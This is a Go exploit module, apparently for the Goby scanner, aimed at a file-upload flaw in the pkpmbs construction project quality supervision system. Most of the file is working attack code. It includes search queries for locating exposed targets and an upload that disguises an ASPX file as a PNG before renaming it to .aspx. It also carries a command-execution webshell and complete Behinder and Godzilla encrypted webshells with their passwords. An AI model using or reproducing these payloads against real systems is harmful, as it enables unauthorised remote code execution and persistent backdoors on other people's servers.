package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "pkpmbs construction project quality supervision system /Platform/System/FileUpload.ashx file upload vulnerability",
    "Description": "<p>The pkpmbs construction project quality supervision system is a B/S framework inspection information supervision system combined with the project quality inspection management system of Hunan Construction Research Information Technology Co., Ltd.</p><p>Attackers can upload malicious files in the system through file upload vulnerabilities, causing serious security problems. Attackers upload malicious files through this vulnerability, which may execute arbitrary code, implant backdoors, or overwrite legitimate files, thereby controlling the entire system.</p>",
    "Product": "Pkpmbs",
    "Homepage": "http://www.hunanjianyan.com/product/detail/16.html",
    "DisclosureDate": "2023-03-05",
    "Author": "1243099890@qq.com",
    "FofaQuery": "body=\"/Content/Theme/Standard/\" || body=\"Standard/DownSoftFile\" || body=\"Website/resource/js/xxtea.js\" || body=\"/Scripts/myJs/public.js\" || body=\"/ProjectManagement/login\"",
    "GobyQuery": "body=\"/Content/Theme/Standard/\" || body=\"Standard/DownSoftFile\" || body=\"Website/resource/js/xxtea.js\" || body=\"/Scripts/myJs/public.js\" || body=\"/ProjectManagement/login\"",
    "Level": "3",
    "Impact": "<p>Attackers can upload malicious files in the system through file upload vulnerabilities, causing serious security problems. Attackers upload malicious files through this vulnerability, which may execute arbitrary code, implant backdoors, or overwrite legitimate files, thereby controlling the entire system.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability:<a href=\"http://www.hunanjianyan.com/\">http://www.hunanjianyan.com/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Login.cshtml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastheader|regex|ASP.NET_SessionId=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/Platform/System/FileUpload.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "324",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "null",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{filename}}}.png\"\r\nContent-Type: image/png\r\n\r\ne165421110ba03099a1c0393373c5b43\r\n<%@ Page Language=\"C#\" Debug=\"true\" %>\r\n<%@ import Namespace=\"System\"%>\r\n<%@ import Namespace=\"System.IO\"%>\r\n<% string pageName = Request.PhysicalPath;%>\r\n<% File.Delete(pageName);%>\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n/Applications/SkillDevelopAndEHS/\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "上传成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/SkillDevelopAndEHS/fileMove.cshtml?filePath={{{filename}}}.png&factFilePath={{{filename}}}.aspx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/SkillDevelopAndEHS/{{{filename}}}.aspx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Login.cshtml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastheader|regex|ASP.NET_SessionId=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/Platform/System/FileUpload.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "324",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "null",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.9 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{filename}}}.png\"\r\nContent-Type: image/png\r\n\r\n<%@page language=\"C#\"%>\r\n<%@ import Namespace=\"System\"%>\r\n<%@ import Namespace=\"System.IO\"%>\r\n<%@ import Namespace=\"System.Xml\"%>\r\n<%@ import Namespace=\"System.Xml.Xsl\"%>\r\n<%\r\nstring xml=@\"<?xml version=\"\"1.0\"\"?><root>test</root>\";\r\nstring xslt=@\"<?xml version='1.0'?>\r\n<xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msxsl=\"\"urn:schemas-microsoft-com:xslt\"\" xmlns:zcg=\"\"zcgonvh\"\">\r\n\t<msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\">\r\n\t<msxsl:assembly name=\"\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>\r\n\t<msxsl:assembly name=\"\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\"/>\r\n\t<msxsl:assembly name=\"\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>\r\n\t<msxsl:assembly name=\"\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"\"/>\r\n\t\t<![CDATA[function xml(){\r\n\t\tvar c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;\r\n\t\tvar command = Request.Item['cmd'];\r\n\t\tvar r = new ActiveXObject(\"\"WScript.Shell\"\").Exec(\"\"cmd /c \"\"+command);\r\n\t\tvar OutStream = r.StdOut;\r\n\t\tvar Str = \"\"\"\";\r\n\t\twhile (!OutStream.atEndOfStream) {\r\n    \t\tStr = Str + OutStream.readAll();\r\n\t\t\t}\r\n\t\tResponse.Write(\"\"<pre>\"\"+Str+\"\"</pre>\"\");\r\n\t\t}]]>\r\n\t</msxsl:script>\r\n<xsl:template match=\"\"/root\"\">\r\n\t<xsl:value-of select=\"\"zcg:xml()\"\"/>\r\n</xsl:template>\r\n</xsl:stylesheet>\";\r\nXmlDocument xmldoc=new XmlDocument();\r\nxmldoc.LoadXml(xml);\r\nXmlDocument xsldoc=new XmlDocument();\r\nxsldoc.LoadXml(xslt);\r\nXsltSettings xslt_settings = new XsltSettings(false, true);\r\nxslt_settings.EnableScript = true;\r\ntry{\r\n\tXslCompiledTransform xct=new XslCompiledTransform();\r\n\txct.Load(xsldoc,xslt_settings,new XmlUrlResolver());\r\n\txct.Transform(xmldoc,null,new MemoryStream());\r\n}\r\ncatch (Exception e){\r\n    Response.Write(\"Error\");\r\n}\r\n%>\r\n<% string pageName = Request.PhysicalPath;%>\r\n<% File.Delete(pageName);%>\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n/Applications/SkillDevelopAndEHS/\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "上传成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/SkillDevelopAndEHS/fileMove.cshtml?filePath={{{filename}}}.png&factFilePath={{{filename}}}.aspx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/Applications/SkillDevelopAndEHS/{{{filename}}}.aspx?cmd={{{cmd}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<pre>(?s)(.*)</pre>"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "pkpmbs 建设工程质量监督系统 /Platform/System/FileUpload.ashx 文件上传漏洞",
            "Product": "pkpmbs",
            "Description": "<p>pkpmbs 建设工程质量监督系统是湖南建研信息技术股份有限公司一个与工程质量检测管理系统相结合的，B/S架构的检测信息监管系统。</p><p>攻击者可以通过文件上传漏洞在系统中上传恶意文件，从而导致严重的安全问题。攻击者通过该漏洞上传恶意文件，可能执行任意代码、植入后门，或者覆盖合法文件，进而控制整个系统。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.hunanjianyan.com/\">http://www.hunanjianyan.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以通过文件上传漏洞在系统中上传恶意文件，从而导致严重的安全问题。攻击者通过该漏洞上传恶意文件，可能执行任意代码、植入后门，或者覆盖合法文件，进而控制整个系统。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "pkpmbs construction project quality supervision system /Platform/System/FileUpload.ashx file upload vulnerability",
            "Product": "Pkpmbs",
            "Description": "<p>The pkpmbs construction project quality supervision system is a B/S framework inspection information supervision system combined with the project quality inspection management system of Hunan Construction Research Information Technology Co., Ltd.</p><p>Attackers can upload malicious files in the system through file upload vulnerabilities, causing serious security problems. Attackers upload malicious files through this vulnerability, which may execute arbitrary code, implant backdoors, or overwrite legitimate files, thereby controlling the entire system.</p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability:<a href=\"http://www.hunanjianyan.com/\">http://www.hunanjianyan.com/</a><br></p><p>2. Set access policies and white list access through security devices such as firewalls.<br></p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>Attackers can upload malicious files in the system through file upload vulnerabilities, causing serious security problems. Attackers upload malicious files through this vulnerability, which may execute arbitrary code, implant backdoors, or overwrite legitimate files, thereby controlling the entire system.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10836"
}`
	uploadWebshellFile275Hadslk := func(hostInfo *httpclient.FixUrl, shellPayload string) bool {
		postRequestConfig := httpclient.NewPostRequestConfig("/Platform/System/FileUpload.ashx")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP")
		postRequestConfig.Data = shellPayload
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return false
		}
		return response.StatusCode == 200 && strings.Contains(response.Utf8Html, "\"msg\":\"上传成功\"")
	}
	checkWebshellFileExistoapOIALF123 := func(hostInfo *httpclient.FixUrl, randFileName, webShellFileName, randCheckString string) bool {
		getRequestConfig := httpclient.NewGetRequestConfig("/Applications/SkillDevelopAndEHS/fileMove.cshtml?filePath=" + randFileName + ".png&factFilePath=" + webShellFileName)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return false
		}
		getRequestConfig = httpclient.NewGetRequestConfig("/Applications/SkillDevelopAndEHS/" + webShellFileName)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		response, err = httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return false
		}
		if randCheckString == "" {
			return response.StatusCode == 200
		} else if len(randCheckString) > 0 {
			return response.StatusCode == 200 && strings.Contains(response.Utf8Html, randCheckString)
		}
		return false
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randFileName := goutils.RandomHexString(6)
			randCheckString := goutils.RandomHexString(16)
			if uploadWebshellFile275Hadslk(hostInfo, "------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+randFileName+".png\"\r\nContent-Type: image/png\r\n\r\n<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.IO\"%><% Response.Write(\""+randCheckString+"\");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n/Applications/SkillDevelopAndEHS/\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--") {
				return checkWebshellFileExistoapOIALF123(hostInfo, randFileName, randFileName+".aspx", randCheckString)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			webShell := goutils.B2S(ss.Params["webshell"])
			content := goutils.B2S(ss.Params["content"])
			randFileName := goutils.RandomHexString(6)
			fileName := goutils.B2S(ss.Params["filename"])
			if attackType == "webshell" {
				if webShell == "behinder" {
					// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`
				} else if webShell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }%>`
				}
				shellPayload := "------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + randFileName + ".png\"\r\nContent-Type: image/png\r\n\r\n" + content + "\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n/Applications/SkillDevelopAndEHS/\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--"
				if uploadWebshellFile275Hadslk(expResult.HostInfo, shellPayload) && checkWebshellFileExistoapOIALF123(expResult.HostInfo, randFileName, randFileName+".aspx", "") {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/Applications/SkillDevelopAndEHS/" + randFileName + ".aspx\n"
					if attackType != "custom" && webShell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if attackType != "custom" && webShell == "godzilla" {
						expResult.Output += "Password: pass 加密器：CSHAP_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					} else {
						fmt.Println("no")
					}
					expResult.Output += "Webshell type: aspx"
				} else {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
			} else if attackType == "custom" {
				shellPayload := "------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + randFileName + ".png\"\r\nContent-Type: image/png\r\n\r\n" + content + "\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n/Applications/SkillDevelopAndEHS/\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--"
				if uploadWebshellFile275Hadslk(expResult.HostInfo, shellPayload) && checkWebshellFileExistoapOIALF123(expResult.HostInfo, randFileName, fileName, "") {
					expResult.Success = true
					expResult.Output = "漏洞利用成功\n"
					expResult.Output += "File URL: " + expResult.HostInfo.FixedHostInfo + "/Applications/SkillDevelopAndEHS/" + fileName + "\n"
				}
			}
			return expResult
		},
	))
}
